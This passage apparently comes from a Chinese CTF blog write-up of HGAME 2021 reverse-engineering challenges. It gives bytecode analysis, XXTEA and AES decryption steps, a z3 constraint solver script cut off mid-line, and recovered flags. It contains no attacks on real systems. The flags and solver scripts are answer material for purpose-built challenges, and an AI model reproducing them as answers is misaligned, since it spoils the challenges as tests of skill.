            70 BINARY_SUBSCR             72 ROT_TWO             74 LOAD_FAST                1 (cipher)             76 LOAD_CONST               4 (2)             78 LOAD_FAST                3 (i)             80 BINARY_MULTIPLY             82 STORE_SUBSCR             84 LOAD_FAST                1 (cipher)             86 LOAD_CONST               4 (2)             88 LOAD_FAST                3 (i)             90 BINARY_MULTIPLY             92 LOAD_CONST               5 (1)             94 BINARY_ADD             96 STORE_SUBSCR             98 JUMP_ABSOLUTE           44 12     &gt;&gt;  100 BUILD_LIST               0            102 STORE_FAST               4 (res) 13         104 LOAD_GLOBAL              3 (range)            106 LOAD_FAST                2 (length)            108 CALL_FUNCTION            1            110 GET_ITER        &gt;&gt;  112 FOR_ITER                26 (to 140)            114 STORE_FAST               3 (i) 14         116 LOAD_FAST                4 (res)            118 LOAD_METHOD              4 (append)            120 LOAD_GLOBAL              5 (ord)            122 LOAD_FAST                1 (cipher)            124 LOAD_FAST                3 (i)            126 BINARY_SUBSCR            128 CALL_FUNCTION            1            130 LOAD_FAST                3 (i)            132 BINARY_XOR            134 CALL_METHOD              1            136 POP_TOP            138 JUMP_ABSOLUTE          112 15     &gt;&gt;  140 LOAD_GLOBAL              6 (bytes)            142 LOAD_FAST                4 (res)            144 CALL_FUNCTION            1            146 LOAD_METHOD              7 (hex)            148 CALL_METHOD              0            150 STORE_FAST               4 (res) 16         152 LOAD_GLOBAL              8 (print)            154 LOAD_CONST               6 (&#39;your flag: &#39;)            156 LOAD_FAST                4 (res)            158 BINARY_ADD            160 CALL_FUNCTION            1            162 POP_TOP            164 LOAD_CONST               0 (None)            166 RETURN_VALUE# your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</code></pre><p>大概翻译一下</p><pre><code>raw_flag=input(&#39;give me your flag:\n&#39;)cipher=list(raw_flag)[6:-1]lenth=len(chipher)for i in range(length/2):    chipher[i*2]==chipher[i*2+1]//交换这两个res=&#39;&#39;for i in range(lenth):    res[i]=ord(cipher[i])^ihex()</code></pre><p>写出脚本</p><pre><code>import binasciitemp=b&#39;30466633346f59213b4139794520572b45514d61583151576638643a&#39;temp2=binascii.unhexlify(temp)code=temp2.decode(&#39;utf-8&#39;)chipher=list(code[:-1])flag=[chr(ord(chipher[i])^i) for i in range(len(chipher))]for i in range(len(flag)//2):    mid=flag[i*2+1]    flag[i*2+1]=flag[i*2]    flag[i*2]=midres=&#39;&#39;for i in flag:    res += iprint(&#39;hgame&#123;&#39;+res+&#39;&#125;&#39;)</code></pre><p>得到hgame{G00dj0&amp;<em>H3r3-I$Y@Ur</em>$L@G!~~}</p><h3 id="apacha"><a href="#apacha" class="headerlink" title="apacha"></a>apacha</h3><p>有谁能拒接阿帕茶的诱惑呢。这道题考了一个xxtea算法，做的时候还不知道。。。。</p><p>先大致分析一下主函数<br><img src="https://i.loli.net/2021/02/27/Cz8IQhFK7PJi6rT.png"><br>图里面讲错了，是先加密1~34，只是第35个会对第1个产生影响。</p><p>再来看看算法部分，就贴一个我自己仿照写的吧</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a3[4]=&#123;1,2,3,4&#125;;    unsigned int flag[36]=&#123;&#39;h&#39;, &#39;g&#39;, &#39;a&#39;, &#39;m&#39;, &#39;e&#39;, &#39;&#123;&#39;, &#39;w&#39;, &#39;e&#39;, &#39;f&#39;, &#39;j&#39;, &#39;o&#39;, &#39;z&#39;, &#39;l&#39;, &#39;s&#39;, &#39;d&#39;, &#39;i&#39;, &#39;f&#39;, &#39;j&#39;, &#39;i&#39;, &#39;o&#39;, &#39;w&#39;, &#39;e&#39;, &#39;k&#39;, &#39;g&#39;, &#39;k&#39;, &#39;h&#39;, &#39;l&#39;, &#39;k&#39;, &#39;j&#39;, &#39;l&#39;, &#39;d&#39;, &#39;f&#39;, &#39;a&#39;, &#39;s&#39;, &#39;&#125;&#39;&#125;;//    unsigned int v6=0xf1bbcdc8;    unsigned int v6=0;    unsigned int v7;    unsigned int v9=34;    int result;    int i=0;    do    &#123;        v6=v6-0x61C88647;        v7=v6&gt;&gt;2;            i=0;            do            &#123;                if(i==0)                &#123;                    flag[i]=(flag[i]+(((flag[34]&gt;&gt;5)^((flag[i+1])*4)) + ((flag[34]&lt;&lt;4)^(flag[i+1]&gt;&gt;3)) ^ ((a3[(i^v7)&amp;3] ^flag[34]) + (flag[i+1]^v6))));                &#125;                else                    flag[i]=(flag[i]+(((flag[i-1]&gt;&gt;5)^((flag[i+1])*4)) + ((flag[i-1]&lt;&lt;4)^(flag[i+1]&gt;&gt;3)) ^ ((a3[(i^v7)&amp;3] ^flag[i-1]) + (flag[i+1]^v6))));                i++;            &#125;while(i!=34);        result=(flag[33]&lt;&lt;4)^(flag[0]&gt;&gt;3);        flag[34] = flag[34] + ((((a3[(v9^v7)&amp;3]) ^ flag[33]) + (flag[0]^v6)) ^ (((flag[0]*4)^(flag[33]&gt;&gt;5))+result));    &#125;while(v6!=0x5384540F);    for(i=0;i&lt;35;i++)    &#123;        printf(&quot;%#x &quot;,flag[i]);        if((i+1)%4==0)        &#123;            printf(&quot;\n&quot;);        &#125;    &#125;&#125;</code></pre><p>当时还以为反解不了(认为反解会有两个未知变量)，然后网上找了一个脚本，后头突然才想起可以反解，想错了一个地方。</p><p>然后就给一个网上的脚本来解吧，看起确实比较简洁。</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x9e3779b9#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))void btea(uint32_t *v, int n, uint32_t const key[4])&#123;    uint32_t y, z, sum;    unsigned p, rounds, e;    if (n &gt; 1)            /* Coding Part */    &#123;        rounds = 6 + 52/n;        sum = 0;        z = v[n-1];        do        &#123;            sum += DELTA;            e = (sum &gt;&gt; 2) &amp; 3;            for (p=0; p&lt;n-1; p++)            &#123;                y = v[p+1];                z = v[p] += MX;            &#125;            y = v[0];            z = v[n-1] += MX;        &#125;        while (--rounds);    &#125;    else if (n &lt; -1)      /* Decoding Part */    &#123;        n = -n;        rounds = 6 + 52/n;        sum = rounds*DELTA;        y = v[0];        do        &#123;            e = (sum &gt;&gt; 2) &amp; 3;            for (p=n-1; p&gt;0; p--)            &#123;                z = v[p-1];                y = v[p] -= MX;            &#125;            z = v[n-1];            y = v[0] -= MX;            sum -= DELTA;        &#125;        while (--rounds);    &#125;&#125;int main()&#123;    uint32_t v[35]= &#123;0xE74EB323,0xB7A72836,0x59CA6Fe2,0x967CC5C1,0xE7802674,0x3D2D54E6,    0x8A9D0356,0x99DCC39C,0x7026D8ED,0x6A33FDAD,0xF496550A,0x5C9C6F9E,0x1BE5D04C,    0x6723AE17,0x5270A5C2,0xAC42130A,0x84BE67B2,0x705CC779,0x5C513D98,0xFB36DA2D,    0x22179645,0x5CE3529D,0xD189E1FB,0xE85BD489,0x73C8D11F,0x54B5C196,0xB67CB490,    0x2117E4CA,0x9DE3F994,0x2F5AA1AA,0xA7E801FD,0xC30D6EAB,0x1BADDC9C,0x3453B04A,    0x92A406F9&#125;;    uint32_t const k[4]= &#123;1,2,3,4&#125;;    int n= 35; //n的绝对值表示v的长度，取正表示加密，取负表示解密    // v为要加密的数据是两个32位无符号整数    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位    //printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);    //ea(v, n, k);    //printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);    btea(v, -n, k);       for(int i=0;i&lt;35;i++)           printf(&quot;%c&quot;,v[i]);    return 0;&#125;</code></pre><p>得到hgame{l00ks_1ike_y0u_f0Und_th3_t34}</p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="ezApk"><a href="#ezApk" class="headerlink" title="ezApk"></a>ezApk</h3><p>AES的CBC模式，就是key，和iv需要转换一下，但是我用网站解密不知道为什么只有一半。。。</p><p>jeb打开，找到关键代码<br><img src="https://i.loli.net/2021/02/27/1BdpH6RFGs9YmKS.png"><br>在线网站解就行了,我用的这个<a href="https://the-x.cn/cryptography/Aes.aspx">https://the-x.cn/cryptography/Aes.aspx</a>，其他感觉有点小毛病不支持hex<br><img src="https://i.loli.net/2021/02/27/pAZOoWDLt9kz1I2.png"></p><h3 id="helloRe2"><a href="#helloRe2" class="headerlink" title="helloRe2"></a>helloRe2</h3><p>考察动调和windowsAPI的AES加密吧。之前没遇到过，只知道第二个加密是AES，但是找不到key，和iv。</p><p>第一个加密，看wp好像说是题出了点问题，导致简单了，动调一下就知道在这个这里的比较部分。<br><img src="https://i.loli.net/2021/02/27/TouspzMNHSIqEcQ.png"><br>第二个加密就是AES加密了</p><p>1.key就是password1分别和0<del>0x0F异或，需要注意的是有一个反调试。<br><img src="https://i.loli.net/2021/02/27/SVO2Jkju4RpXx7i.png"><br>2.iv就是0</del>0x0F<br><img src="https://i.loli.net/2021/02/27/MxmP34qrdjClfHR.png"><br>3.密文<br><img src="https://i.loli.net/2021/02/27/Q4uUCzTXoLY7DSA.png"><br>然后网站解密<br><img src="https://i.loli.net/2021/02/27/uTkRSt8l7IgA2di.png"><br>拼接一下得到flag{2b0c5e6a3a20b189_7a4ad6c5671fb313}</p><h3 id="fake-debugger-beta"><a href="#fake-debugger-beta" class="headerlink" title="fake_debugger beta"></a>fake_debugger beta</h3><p>一个端口题，没做起，不知道怎么弄。看了wp才知道，居然可以按空格一步步调试，然后环境已经关了，就没做了。</p><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="FAKE"><a href="#FAKE" class="headerlink" title="FAKE"></a>FAKE</h3><p>考了SMC，和z3约束器吧，倒是解决了我以前遗留的一些问题。</p><p>ida，看起很简单，于是就做错了。<br><img src="https://i.loli.net/2021/02/27/ykvVjRwZY8XQ3Bd.png"><br>下面是用z3解的，长的一批，哭了。</p><pre><code>from z3 import *s = Solver()v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13,v14,v15,v16,v17,v18,v19,v20,v21,v22,v23,v24,v25,v26,v27,v28,v29,v30,v31,v32,v33,v34,v35,v36=Ints(&#39;v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 v11 v12 v13 v14 v15 v16 v17 v18 v19 v20 v21 v22 v23 v24 v25 v26 v27 v28 v29 v30 v31 v32 v33 v34 v35 v36&#39;)a1 = [0]*36for i in range(36):    a1[i] = Int(&#39;a1[&#39;+str(i)+&#39;]&#39;)s.add(v1 == -19 * a1[4]     + 88 * a1[25]     + -7 * a1[30]     + a1[27]     + -33 * a1[20]     + -23 * a1[23]     + 90 * a1[14]     + -99 * a1[10]     + 30 * a1[29]     + -37 * a1[1]     + -58 * a1[33]     + 17 * a1[7]     + 26 * a1[31]     + -20 * a1[12]     + -56 * a1[26]     + 70 * a1[19]     + 29 * a1[0]     + -42 * a1[17]     + 67 * a1[35]     + 11 * a1[6]     + 66 * a1[15]     + 53 * a1[11]     - 53 * a1[3]     + 63 * a1[32]     - 65 * a1[21]     + 9 * a1[9]     - 50 * a1[28]     - 48 * a1[8]     - 70 * a1[22]     + 48 * a1[13]    - 68 * a1[34]     - 14 * a1[5])s.add(-35 * a1[2] + 89 * a1[24] + -49 * a1[16] + v1 - 67 * a1[18] == -874)s.add(v2 == -41 * a1[25]     + -47 * a1[16]     + a1[14]     + 67 * a1[34]     + -20 * a1[1]     + 47 * a1[33]     + -79 * a1[19]     + -17 * a1[6]     + (30 * a1[5])     + (a1[18] *64)     + (-57 * a1[15])     + 90 * a1[21]     + 57 * a1[4]     + -63 * a1[13]     + 13 * a1[2]     + 10 * a1[35]     + -56 * a1[8]     + 56 * a1[31]     + -40 * a1[0]     + -91 * a1[27]     + 57 * a1[23]     + 62 * a1[10]     + 90 * a1[9]     + -92 * a1[17]     + -5 * a1[29]     + 60 * a1[22]     - 13 * a1[12]     + 5 * a1[28]     - 63 * a1[32]     + 5 * a1[26]     + 70 * a1[3]     + 41 * a1[7])s.add(v2 + 71 * a1[24] + 15 * a1[11] + 42 * a1[20] == 21163)s.add( v3 == 50 * a1[20]     + 88 * a1[35]     + 49 * a1[1]     + 34 * a1[23]     + 58 * a1[29]     + 69 * a1[24]     + 28 * a1[13]     + 77 * a1[19]     + 2 * a1[7]     + -53 * a1[10]     + -61 * a1[4]     + 12 * a1[17]     + 93 * a1[11]     + -13 * a1[32]     + 53 * a1[9]     + 29 * a1[16]     + -77 * a1[14]     + 77 * a1[33]     + 74 * a1[34]     + -100 * a1[30]     - 99 * a1[27]     - 87 * a1[25]     + 36 * a1[6]     + 59 * a1[3]     + 81 * a1[21]     + 28 * a1[28]     + 7 * a1[0]     + 54 * a1[22]     - 5 * a1[31]     - 41 * a1[2]     + 5 * a1[18]     - 93 * a1[15])s.add( 73 * a1[26] + v3 + 10 * a1[12] - 27 * a1[8] + 24 * a1[5] == 45615)s.add(v4 == 53 * a1[21]     + 51 * a1[13]     + 58 * a1[17]     + -52 * a1[10]     + -77 * a1[7]     + 86 * a1[11]     + -77 * a1[16]     + -100 * a1[18]     + -61 * a1[2]     + -46 * a1[20]     + -61 * a1[6]     + -46 * a1[19]     + 51 * a1[4]     + -76 * a1[34]     + -17 * a1[31]     + 8 * a1[28]     + 94 * a1[30]     + 23 * a1[8]     + -61 * a1[29]     + -52 * a1[35]     + 81 * a1[33]     + -44 * a1[1]     + 75 * a1[32]     + -9 * a1[24]     - 96 * a1[12]     + 5 * a1[26]     + 2 * a1[25]     + 31 * a1[22]     + 43 * a1[15]     - 2 * a1[0]     - 92 * a1[14]     + 13 * a1[5])s.add(-17 * a1[23] + v4 - 99 * a1[3] + 63 * a1[27] + 8 * a1[9] == -37017)s.add(v5 == 91 * a1[0]     + -43 * a1[32]     + 17 * a1[13]     + 9 * a1[15]     + (a1[1] *64)     + 9 * a1[16]     + 59 * a1[3]     + -29 * a1[14]     + 32 * a1[18]     + -69 * a1[26]     + -81 * a1[33]     + -69 * a1[9]     + 60 * a1[19]     + -35 * a1[21]     + 40 * a1[11]     + -44 * a1[7]     + 78 * a1[22]     + 68 * a1[28]     + 70 * a1[29]     + 3 * a1[2]     + 61 * a1[6]     + 37 * a1[35]     - 36 * a1[27]     + 40 * a1[34]     + 23 * a1[17]     + 81 * a1[12]     + 69 * a1[30]     - 9 * a1[23]     - 75 * a1[25]     - 62 * a1[20]     + 56 * a1[31]     + 96 * a1[5])s.add( -25 * a1[4] + v5 + 69 * a1[8] + 80 * a1[10] + 99 * a1[24] == 72092)s.add(v6 == -76 * a1[28]     + 48 * a1[18]     + 93 * a1[1]     + 66 * a1[29]     + -86 * a1[27]     + -3 *a1[0]     + -79 * a1[26]     + -20 * a1[8]     + 90 * a1[6]     + 6 * a1[30]     + 47 * a1[16]     + 50 * a1[20]     + 51 * a1[23]     + -13 * a1[33]     + -86 * a1[13]     + 32 * a1[31]     + -89 * a1[2]     + 79 * a1[11]     + -41 * a1[7]     + -56 * a1[14]     + 54 * a1[19]     - 96 * a1[34]     - 34 * a1[25]     - (a1[4] *64)     - 36 * a1[35]     + 48 * a1[10]     - 39 * a1[5]     + 20 * a1[3]     + 61 * a1[17]     - 56 * a1[15]     - 97 * a1[22]     + 96 * a1[9])s.add( 51 * a1[32] + -63 * a1[21] + 78 * a1[24] + v6 - 61 * a1[12] == -27809)s.add(v7 == -32 * a1[23]     + -74 * a1[28]     + 76 * a1[33]     + 91 * a1[5]     + 83 * a1[19]     + 99 * a1[32]     + 98 * a1[7]     + 22 * a1[34]     + 83 * a1[13]     + -13 * a1[0]     + -66 * a1[11]     + -25 * a1[2]     + -9 * a1[31]     + 35 * a1[25]     + 31 * a1[18]     - 95 * a1[21]     + 37 * a1[22]     - 74 * a1[16]     + 17 * a1[12]     - 27 * a1[24]     + 11 * a1[3]     + 83 * a1[9]     - 60 * a1[27]     + 77 * a1[20]     + 96 * a1[15]     - 23 * a1[10])s.add(-44 * a1[35]     + -26 * a1[30]     + -36 * a1[4]     + (a1[6] *64)     + -65 * a1[26]     + -46 * a1[8]     + -33 * a1[14]     + -45 * a1[1]     + v7     - 5 * a1[29]     - 73 * a1[17] == 9604)s.add(v8 == 82 * a1[8]     + -88 * a1[3]     + -26 * a1[11]     + 76 * a1[1]     + 69 * a1[27]     + -51 * a1[14]     + 78 * a1[33]     + -11 * a1[18]     + -83 * a1[5]     + 70 * a1[20]     + -36 * a1[22]     + -57 * a1[31]     + 32 * a1[25]     + 55 * a1[16]     + 42 * a1[24]     + -93 * a1[26]     + 69 * a1[17]     + 84 * a1[12]     + 9 * a1[23]     + -34 * a1[32]     + -84 * a1[2]     + -18 * a1[7]     + 60 * a1[29]     - 99 * a1[30]     - a1[0]     + 24 * a1[21]     - 36 * a1[4]     + 9 * a1[35]     + 89 * a1[15]     + 72 * a1[19]     + 86 * a1[13]     - 8 * a1[28])s.add( -79 * a1[10] + v8 + (a1[6] *64) + 19 * a1[9] + 71 * a1[34] == 25498)s.add(v9 == 65 * a1[32]     + -62 * a1[34]     + 79 * a1[10]     + -82 * a1[27]     + -16 * a1[29]     + -60 * a1[1]     + -80 * a1[15]     + -54 * a1[2]     + 75 * a1[6]     + -31 * a1[17]     + 29 * a1[12]     + 28 * a1[28]     + 57 * a1[14]     + -68 * a1[4]     + 86 *a1[0]     + 82 * a1[13]     + -20 * a1[11]     + -18 * a1[23]     + 88 * a1[18]     + -57 * a1[25]     + 94 * a1[9]     - 51 * a1[5]     - 58 * a1[7]     - 2 * a1[3]     + 94 * a1[31]     - 6 * a1[21]     - 59 * a1[19]     + 25 * a1[20]     - 66 * a1[35]     - 62 * a1[24]     + 89 * a1[26])s.add(-70 * a1[8] + 50 * a1[30] + 26 * a1[16] + v9 + 12 * a1[22] - 86 * a1[33] == -10472)s.add(v10 == 30 * a1[10]      + 72 * a1[8]      + 72 * a1[29]      + -49 * a1[34]      + 83 * a1[18]      + -63 * a1[0]      + -88 * a1[4]      + -91 * a1[20]      + -11 * a1[17]      + 38 * a1[3]      + 53 * a1[35]      + 31 * a1[5]      + -75 * a1[22]      + 14 * a1[26]      + -7 * a1[24]      + -7 * a1[31]      + 77 * a1[23]      + -46 * a1[6]      + 47 * a1[19]      + 48 * a1[33]      + 74 * a1[1]      - 24 * a1[30]      + 87 * a1[9]      + 33 * a1[11]      + 86 * a1[28]      + 37 * a1[21]      - 97 * a1[27]      - 30 * a1[13]      - 59 * a1[16]      + 5 * a1[7]      - 3 * a1[15]      + 13 * a1[12])s.add(31 * a1[14] + -11 * a1[2] + v10 - 73 * a1[32] - 56 * a1[25] == 6560)s.add(v11 == -81 * a1[8]      + 49 * a1[0]      + -52 * a1[3]      + 84 * a1[2]      + 26 * a1[25]      + -74 * a1[20]      + -97 * a1[6]      + 14 * a1[15]      + 77 * a1[30]      + -66 * a1[28]      + -89 * a1[12]      + -95 * a1[13]      + -70 * a1[10]      + -27 * a1[1]      + -85 * a1[22]      + -66 * a1[34]      + -91 * a1[4]      - 5 * a1[19]      - 94 * a1[29]      - 24 * a1[35]      - 7 * a1[32]      + 63 * a1[5]      - 49 * a1[14]      - 96 * a1[18]      - 100 * a1[7]      + 81 * a1[16]      + 70 * a1[11]      + 3 * a1[21]      + 28 * a1[24]      - 14 * a1[9]      + 59 * a1[17]      + 24 * a1[31])s.add(59 * a1[23] + v11 - 25 * a1[27] + 20 * a1[33] - 77 * a1[26] == -69431)s.add(v12 == 2 * a1[7]      + 70 * a1[19]      + 53 * a1[35]      + 34 * a1[6]      + 30 * a1[5]      + 55 * a1[23]      + 69 * a1[10]      + 60 * a1[2]      + -69 * a1[25]      + 33 * a1[20]      + 55 * a1[24]      + 69 * a1[18]      + 83 * a1[15]      + -19 * a1[13]      + 22 * a1[21]      + a1[16]      + -53 * a1[22]      + -58 * a1[4]      + -63 * a1[29]      - 91 * a1[26]      + 28 * a1[34]      + 5 * a1[3]      + 35 * a1[8]      + 27 * a1[1]      - 31 * a1[27]      + 10 * a1[12]      + 84 * a1[33]      + 24 * a1[14]      + 42 * a1[11]      - 2 * a1[17]      + 68 * a1[32]      + 21 * a1[0])s.add(98 * a1[28] + v12 - a1[9] + 60 * a1[31] - 60 * a1[30] == 54106)s.add( v13 == (a1[18] *64)      + -61 * a1[15]      + -92 * a1[13]      + 50 * a1[8]      + 90 * a1[29]      + 32 * a1[4]      + -97 * a1[27]      + 14 * a1[14]      + a1[30]      + 97 * a1[7]      + 15 * a1[31]      + -96 * a1[21]      + 38 * a1[19]      + -81 * a1[9]      + -68 * a1[12]      + 89 * a1[20]      + 33 * a1[2]      + 70 * a1[34]      + 79 * a1[28]      + -80 * a1[35]      + 76 * a1[10]      - 38 * a1[5]      + 5 * a1[6]      + 60 * a1[11]      - 8 * a1[26]      - 59 * a1[23]      + 9 * a1[24]      + 34 * a1[17]      - 60 * a1[1]      + 98 * a1[25]      + 48 * a1[16]      - 17 * a1[32])s.add(-88 * a1[22] + -96 * a1[3] + v13 - 96 * a1[0] + 54 * a1[33] == -8292)s.add(v14 == -29 * a1[24]      + -28 * a1[26]      + -7 * a1[3]      + 49 * a1[17]      + 60 * a1[25]      + -45 * a1[16]      + -50 * a1[0]      + -98 * a1[28]      + -92 * a1[12]      + -22 * a1[23]      + 33 * a1[13]      + 57 * a1[31]      - 15 * a1[5]      + 36 * a1[29]      - 88 * a1[15]      + 12 * a1[21]      + 71 * a1[14]      - 48 * a1[35]      + 79 * a1[34]      - 5 * a1[19]      + 68 * a1[33]      - 2 * a1[4]      - 82 * a1[10]      - 16 * a1[18]      - 98 * a1[22]      - (a1[27] *64)      + 32 * a1[11]      + 73 * a1[2]      - 38 * a1[20]      + 27 * a1[9]      - 7 * a1[7])s.add( -58 * a1[32] + 53 * a1[8] + -57 * a1[30] + v14 - 30 * a1[1] - 35 * a1[6] == -44677)s.add(v15 == 91 * a1[15]      + 91 * a1[8]      + 58 * a1[16]      + -91 * a1[23]      + 4 * a1[31]      + -43 * a1[18]      + -36 * a1[29]      + 60 * a1[14]      + 29 * a1[20]      + -85 * a1[19]      + 71 * a1[27]      + -22 * a1[11]      + 95 * a1[9]      + 19 * a1[12]      + -20 * a1[30]      + 6 * a1[34]      + 49 * a1[6]      + 13 * a1[10]      - 23 * a1[13]      + 17 * a1[7]      - 79 * a1[22]      + 12 * a1[3]      - 7 * a1[4]      - 12 * a1[2]      - 78 * a1[17]      - 56 * a1[5]      + 59 * a1[26]      + 18 * a1[32]      - 87 * a1[35]      - 30 * a1[24]      + 54 * a1[25]      - 5 * a1[1])s.add(-86 * a1[28] + -69 * a1[33] + -31 * a1[21] + v15 - 94 * a1[0] == -17772)s.add(v16 == 65 * a1[3]      + -78 * a1[13]      + -71 * a1[26]      + -44 * a1[23]      + 61 * a1[7]      + 63 * a1[1]      + 9 * a1[16]      + -17 * a1[9]      + -93 * a1[12]      + -85 * a1[20]      + -73 * a1[35]      + -87 * a1[24]      + -80 * a1[25]      + -87 * a1[4]      + 56 * a1[27]      + -89 * a1[21]      + 52 * a1[15]      + 97 * a1[0]      + -11 * a1[19]      + -94 * a1[10]      + -92 * a1[29]      + -20 * a1[17]      - 95 * a1[5]      - 13 * a1[8]      + 80 * a1[31]      - a1[33]      + 37 * a1[30]      + (a1[32] *64)      + 11 * a1[22]      - 39 * a1[14]      + 80 * a1[6]      - 33 * a1[11])s.add(-18 * a1[18] + -76 * a1[34] + v16 - 62 * a1[2] - 74 * a1[28] == -77151)s.add(v17 == -4 * a1[26]      + 59 * a1[6]      + -85 * a1[34]      + 69 * a1[29]      + 77 * a1[31]      + -95 * a1[8]      + 75 * a1[16]      + 54 * a1[20]      + 65 * a1[22]      + -9 * a1[9]      + -61 * a1[24]      + -45 * a1[25]      + 47 * a1[4]      + 31 * a1[5]      + 36 * a1[23]      + 20 * a1[13]      - 40 * a1[2]      - (a1[12] *64)      - 40 * a1[14]      + 81 * a1[10]      - 35 * a1[0]      - 12 * a1[27]      + 35 * a1[30]      + 63 * a1[15]      - 65 * a1[19]      + 31 * a1[18]      - 42 * a1[35]      + 33 * a1[11]      - 19 * a1[3]      + 65 * a1[21]      - 78 * a1[7])s.add(43 * a1[33] + 76 * a1[32] + v17 - 48 * a1[28] - 77 * a1[17] == 11531)s.add(v18 == 33 * a1[32]      + 96 * a1[14]      + 47 * a1[31]      + -92 * a1[27]      + -51 * a1[1]      + -25 * a1[28]      + -12 * a1[0]      + 55 * a1[17]      + 35 * a1[20]      + 76 * a1[13]      + -73 * a1[15]      + 84 * a1[12]      + -72 * a1[3]      + 71 * a1[24]      + -41 * a1[7]      + 28 * a1[8]      + -93 * a1[34]      + -63 * a1[30]      + 35 * a1[6]      - 38 * a1[10]      - 4 * a1[16]      + 99 * a1[11]      + 10 * a1[4]      - 98 * a1[35]      - 9 * a1[18]      + 22 * a1[21]      - 6 * a1[26]      + 82 * a1[2]      - 6 * a1[33]      - 13 * a1[29])s.add(67 * a1[23] + 95 * a1[5] + -37 * a1[9] + -71 * a1[25] + v18 + 25 * a1[22] - 35 * a1[19] == 4538)s.add( v19 == -50 * a1[25]      + -76 * a1[3]      + -65 * a1[28]      + -36 * a1[31]      + 88 * a1[34]      + 79 * a1[27]      + 87 * a1[24]      + -52 * a1[29]      + -72 * a1[13]      + -17 * a1[23]      + 54 * a1[0]      + 45 * a1[10]      + -17 * a1[33]      + -49 * a1[4]      + -34 * a1[17]      + 87 * a1[7]      + -41 * a1[18]      + 2 * a1[30]      + -81 * a1[11]      + 37 * a1[35]      - 46 * a1[9]      + 25 * a1[32]      - 45 * a1[14]      - 30 * a1[12]      + 83 * a1[19]      + 24 * a1[1]      + 77 * a1[20])s.add(98 * a1[16]     + (a1[21]*64)     + 93 * a1[8]     + 78 * a1[2]     + 56 * a1[15]     + -51 * a1[6]     + -17 * a1[26]     + v19     - 62 * a1[5]     + 67 * a1[22] == 33735)s.add(v20 == -71 * a1[30]      + 61 * a1[10]      + -25 * a1[4]      + 82 * a1[32]      + 62 * a1[22]      + -40 * a1[34]      + 90 * a1[3]      + -36 * a1[14]      + 37 * a1[17]      + -21 * a1[19]      + 55 * a1[21]      + -70 * a1[26]      + 92 * a1[6]      + 75 * a1[31]      + -35 * a1[29]      + -50 * a1[25]      + 8 * a1[33]      + -74 * a1[13]      + 34 * a1[35]      + 29 * a1[24]      + -10 * a1[15]      + -75 * a1[16]      + 24 * a1[18]      + 98 * a1[0]      + 41 * a1[20]      - 54 * a1[28]      - 5 * a1[23]      - 66 * a1[9]      + 3 * a1[5]      - 66 * a1[2]      + 15 * a1[12]      - 74 * a1[27])s.add(30 * a1[1] + -29 * a1[7] + v20 + 31 * a1[8] - 68 * a1[11] == -7107)s.add(v21 == -83 * a1[29]      + 55 * a1[35]      + -75 * a1[8]      + 77 * a1[31]      + 84 * a1[22]      + -34 * a1[13]      + -13 * a1[15]      + -11 * a1[19]      + 28 * a1[17]      + 98 * a1[9]      + -69 * a1[3]      + (a1[25] *64)      + -66 * a1[7]      + -71 * a1[6]      + 75 * a1[34]      + 19 * a1[32]      + -94 * a1[33]      - 72 * a1[18]      + 35 * a1[26]      - 32 * a1[27]      + 76 * a1[1]      + 80 * a1[28]      + 66 * a1[10]      + 3 * a1[12]      - 99 * a1[14]      + 17 * a1[30]      - 94 * a1[0]      + 12 * a1[2]      + 61 * a1[20]      - 24 * a1[23]      + 62 * a1[11]      + 37 * a1[16])s.add(-79 * a1[24] + v21 - 65 * a1[21] - 2 * a1[4] - 90 * a1[5] == -17028)s.add(v22 == (a1[15] *64)      + 43 * a1[11]      + 39 * a1[23]      + 68 * a1[33]      + -58 * a1[13]      + 21 * a1[1]      + 19 * a1[19]      + 96 * a1[8]      + 24 * a1[3]      + -76 * a1[2]      + -94 * a1[16]      + -37 * a1[4]      + -31 * a1[7]      + -65 * a1[0]      + -23 * a1[22]      + 80 * a1[24]      + -48 * a1[20]      + -42 * a1[32]      + 47 * a1[9]      - 95 * a1[6]      - 10 * a1[35]      - 30 * a1[34]      - 67 * a1[12]      + 81 * a1[14]      - 21 * a1[27]      + 65 * a1[18]      + 60 * a1[25]      + 31 * a1[17]      - 20 * a1[31]      - 32 * a1[30]      - 83 * a1[28]      + 20 * a1[5])s.add( -17 * a1[21] + -34 * a1[26] + v22 - 3 * a1[29] + 7 * a1[10] == -21641)s.add(v23 == -52 * a1[7]      + -82 * a1[23]      + 14 * a1[27]      + 52 * a1[6]      + 67 * a1[11]      + a1[3]      + -37 * a1[30]      + -76 * a1[0]      + -82 * a1[22]      + -92 * a1[24]      + 53 * a1[20]      + -90 * a1[5]      + 3 * a1[34]      + 93 * a1[2]      + 77 * a1[25]      + -40 * a1[16]      + -59 * a1[26]      + -91 * a1[15]      + 55 * a1[9]      + -84 * a1[35]      + -46 * a1[12]      + -41 * a1[31]      + -55 * a1[8]      + 97 * a1[32]      + 56 * a1[19]      - 15 * a1[13]      - 93 * a1[4]      + 37 * a1[33]      - 88 * a1[18]      - 16 * a1[10]      + a1[14]      + 48 * a1[17]      - 80 * a1[21])s.add(v23 + 17 * a1[29] - 94 * a1[28] - 12 * a1[1] == -71317)s.add( v24 == 34 * a1[32]      + -12 * a1[29]      + -16 * a1[7]      + 22 * a1[18]      + -52 * a1[31]      + -71 * a1[21]      + -55 * a1[5]      + -76 * a1[4]      + -94 * a1[10]      + -79 * a1[26]      + 95 * a1[28]      + 58 * a1[3]      + -85 * a1[13]      + -74 * a1[27]      + -35 * a1[16]      + 68 * a1[2]      + 84 * a1[11]      + -25 * a1[23]      + -91 * a1[33]      + -87 * a1[14]      + -65 * a1[34]      + 23 * a1[20]      + -91 * a1[15]      + 34 * a1[12]      + 53 * a1[1]      - 16 * a1[24]      + 83 * a1[22]      + 5 * a1[17]      - 71 * a1[6])s.add(46 * a1[9] + 